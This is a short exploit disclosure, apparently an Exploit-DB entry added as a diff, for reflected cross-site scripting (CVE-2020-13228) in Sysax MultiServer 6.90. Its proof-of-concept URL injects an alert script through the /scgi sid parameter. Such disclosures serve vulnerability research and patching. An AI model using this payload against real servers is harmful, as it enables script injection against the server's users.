@@ -1,0 +1,17 @@
+# Exploit Title: Sysax MultiServer 6.90 - Reflected Cross Site Scripting
+# Google Dork: n.d.
+# Date: 2020-06-02
+# Exploit Author: Luca Epifanio (wrongsid3)
+# Vendor Homepage: https://www.sysax.com/
+# Software Link: https://www.sysax.com/download.htm
+# Version: MultiServer 6.90
+# Tested on: Windows 10 x64
+# CVE : CVE-2020-13228
+
+There is reflected XSS via the /scgi sid parameter.
+
+PoC:
+http://192.168.88.131/scgi?sid=684216c78659562c92775c885e956585cdb180fd
+<script>alert("XSS")</script>&pid=transferpage2_name1_fff.htm
+
+PoC Screen: https://pasteboard.co/J9eE2GQ.png
